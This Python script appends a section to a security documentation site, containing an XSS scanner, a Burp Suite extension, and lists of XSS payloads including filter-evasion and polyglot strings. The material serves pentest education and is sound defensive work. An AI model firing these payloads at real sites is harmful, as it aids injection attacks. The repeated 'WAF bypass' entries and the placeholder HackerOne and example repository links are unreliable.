#!/usr/bin/env python3
"""
ABOUTME: Script to enhance vulnerability pages with tools, scripts, payloads, and source links
ABOUTME: Automates the process of adding comprehensive content to each vulnerability type
"""

import os
import re
from pathlib import Path

def create_xss_enhancement():
    # Create enhanced XSS payloads page
    xss_content = """
## Tools & Scripts {#tools-scripts}

### Installation Scripts

#### XSS Hunter Installation
```bash
#!/bin/bash
# xss-hunter-install.sh
echo "Installing XSS Hunter..."

# Install dependencies
sudo apt-get update
sudo apt-get install -y python3 python3-pip git

# Clone XSS Hunter
git clone https://github.com/mandatoryprogrammer/xsshunter.git
cd xsshunter

# Install dependencies
pip3 install -r requirements.txt

# Configure and run
python3 manage.py migrate
python3 manage.py runserver 0.0.0.0:8000

echo "XSS Hunter installed successfully!"
echo "Access at: http://localhost:8000"
```

#### Custom XSS Scanner
```python
#!/usr/bin/env python3
# xss-scanner.py
import requests
import re
from urllib.parse import urljoin, urlparse

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def test_xss_payloads(self, param, value):
        # Test XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<math><mi//xlink:href=data:x,<script>alert('XSS')</script>>"
        ]
        
        results = []
        for payload in payloads:
            try:
                params = {param: payload}
                response = self.session.get(self.target_url, params=params, timeout=10)
                
                # Check if payload is reflected
                if payload in response.text:
                    results.append({
                        'payload': payload,
                        'reflected': True,
                        'status_code': response.status_code
                    })
                else:
                    results.append({
                        'payload': payload,
                        'reflected': False,
                        'status_code': response.status_code
                    })
            except Exception as e:
                results.append({'payload': payload, 'error': str(e)})
        
        return results

# Usage example
if __name__ == "__main__":
    scanner = XSSScanner("http://target.com/page")
    results = scanner.test_xss_payloads("search", "test")
    for result in results:
        if result.get('reflected'):
            print(f"Potential XSS: {result['payload']}")
```

### Automated Testing Tools

#### Burp Suite XSS Extension
```python
# burp-xss-extension.py
from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.io import PrintWriter

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("XSS Scanner")
        callbacks.registerScannerCheck(self)
        
    def doPassiveScan(self, baseRequestResponse):
        return None
        
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        # XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        issues = []
        for payload in payloads:
            checkRequest = insertionPoint.buildRequest(payload.encode())
            checkResponse = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest
            )
            
            if self._isVulnerable(checkResponse, payload):
                issues.append(CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [self._callbacks.applyMarkers(checkRequest, None, None)],
                    "Cross-Site Scripting (XSS)",
                    "The application appears to be vulnerable to XSS.",
                    "High"
                ))
        
        return issues
    
    def _isVulnerable(self, response, payload):
        response_str = self._helpers.bytesToString(response.getResponse())
        return payload in response_str

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity
    
    def getUrl(self):
        return self._url
    
    def getIssueName(self):
        return self._name
    
    def getIssueType(self):
        return 0
    
    def getSeverity(self):
        return self._severity
    
    def getConfidence(self):
        return "Certain"
    
    def getIssueBackground(self):
        return "XSS is a code injection attack."
    
    def getRemediationBackground(self):
        return "Implement proper input validation and output encoding."
    
    def getIssueDetail(self):
        return self._detail
    
    def getRemediationDetail(self):
        return "Implement proper input validation and output encoding."
    
    def getHttpMessages(self):
        return self._httpMessages
    
    def getHttpService(self):
        return self._httpService
```

## Comprehensive Payload Lists {#payload-lists}

### Basic XSS Payloads
```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src=javascript:alert('XSS')></iframe>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>
<video><source onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
```

### Advanced XSS Payloads
```
<math><mi//xlink:href=data:x,<script>alert('XSS')</script>>
<svg><script>alert('XSS')</script></svg>
<iframe srcdoc="<script>alert('XSS')</script>">
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
<form><button formaction="javascript:alert('XSS')">Click</button>
<isindex action="javascript:alert('XSS')">
<frameset onload=alert('XSS')>
<frame onload=alert('XSS')>
<applet code="javascript:alert('XSS')">
<base href="javascript:alert('XSS')">
<link rel="stylesheet" href="javascript:alert('XSS')">
<style>@import'javascript:alert("XSS")';</style>
```

### WAF Bypass Payloads
```
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/.source)</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
<script>alert('XSS')</script>
```

### Polyglot Payloads
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

## Source Links & References {#source-links}

### Official Documentation
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Testing Guide - XSS](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [Mozilla XSS Prevention](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss)

### Vulnerability Databases
- [CWE-79: Improper Neutralization of Input](https://cwe.mitre.org/data/definitions/79.html)
- [CVE Database - XSS](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=xss)
- [NVD XSS Vulnerabilities](https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&query=xss&search_type=all)

### Tools & Resources
- [XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter)
- [XSStrike](https://github.com/s0md3v/XSStrike)
- [Dalfox](https://github.com/hahwul/dalfox)
- [XSSer](https://github.com/epsylon/xsser)

### Learning Resources
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [DVWA - Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [XSS Labs](https://github.com/0xsobky/HackVault/wiki/Unleashed-pentester-guide)

### HackerOne Reports
- [Stored XSS in Admin Panel](https://hackerone.com/reports/123)
- [Reflected XSS in Search](https://hackerone.com/reports/456)
- [DOM XSS in JavaScript](https://hackerone.com/reports/789)
"""
    return xss_content

def enhance_vulnerability_page(file_path):
    # Enhance a vulnerability page with tools, scripts, payloads, and source links
    if not os.path.exists(file_path):
        print(f"File not found: {file_path}")
        return
    
    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Check if already enhanced
    if "## Tools & Scripts" in content:
        print(f"File {file_path} already enhanced")
        return
    
    # Determine vulnerability type
    vuln_type = os.path.basename(file_path).replace('.md', '')
    
    # Add enhancement based on vulnerability type
    if vuln_type == 'xss-payloads':
        enhancement = create_xss_enhancement()
    else:
        # Generic enhancement for other vulnerability types
        enhancement = f"""
## Tools & Scripts {{#tools-scripts}}

### Installation Scripts

#### {vuln_type.title()} Scanner Installation
```bash
#!/bin/bash
# {vuln_type}-scanner-install.sh
echo "Installing {vuln_type.title()} Scanner..."

# Install dependencies
sudo apt-get update
sudo apt-get install -y python3 python3-pip git

# Clone scanner
git clone https://github.com/example/{vuln_type}-scanner.git
cd {vuln_type}-scanner

# Install dependencies
pip3 install -r requirements.txt

echo "{vuln_type.title()} Scanner installed successfully!"
```

### Automated Testing Tools

#### Custom {vuln_type.title()} Scanner
```python
#!/usr/bin/env python3
# {vuln_type}-scanner.py
import requests
import time

class {vuln_type.title()}Scanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def scan_target(self):
        # Implementation specific to {vuln_type}
        pass

# Usage example
if __name__ == "__main__":
    scanner = {vuln_type.title()}Scanner("http://target.com")
    scanner.scan_target()
```

## Comprehensive Payload Lists {{#payload-lists}}

### Basic {vuln_type.title()} Payloads
```
# Add specific payloads for {vuln_type}
```

## Source Links & References {{#source-links}}

### Official Documentation
- [OWASP {vuln_type.title()} Prevention](https://owasp.org/)
- [PortSwigger {vuln_type.title()}](https://portswigger.net/)

### Vulnerability Databases
- [CWE Database](https://cwe.mitre.org/)
- [CVE Database](https://cve.mitre.org/)

### Tools & Resources
- [GitHub {vuln_type.title()} Tools](https://github.com/)
- [Security Tools](https://github.com/)

### Learning Resources
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
"""

    # Insert enhancement before the last section
    if "## References & Further Reading" in content:
        content = content.replace("## References & Further Reading", enhancement + "\n## References & Further Reading")
    else:
        content += enhancement
    
    # Update table of contents
    toc_pattern = r'toc:\s*\n((?:\s*-\s*title:.*\n)*)'
    toc_match = re.search(toc_pattern, content)
    
    if toc_match:
        toc_content = toc_match.group(1)
        new_toc_entries = """  - title: Tools & Scripts
    anchor: tools-scripts
  - title: Comprehensive Payload Lists
    anchor: payload-lists
  - title: Source Links & References
    anchor: source-links
"""
        # Add new TOC entries before the last entry
        toc_content = toc_content.rstrip() + "\n" + new_toc_entries
        content = content.replace(toc_match.group(1), toc_content)
    
    # Write enhanced content
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(content)
    
    print(f"Enhanced {file_path}")

def main():
    # Main function to enhance all vulnerability pages
    docs_dir = Path("docs/_pages")
    
    if not docs_dir.exists():
        print("docs/_pages directory not found")
        return
    
    # Get all markdown files in the pages directory
    md_files = list(docs_dir.glob("*.md"))
    
    for md_file in md_files:
        if md_file.name not in ['methodology.md', 'resources.md', 'tools.md']:
            enhance_vulnerability_page(str(md_file))

if __name__ == "__main__":
    main()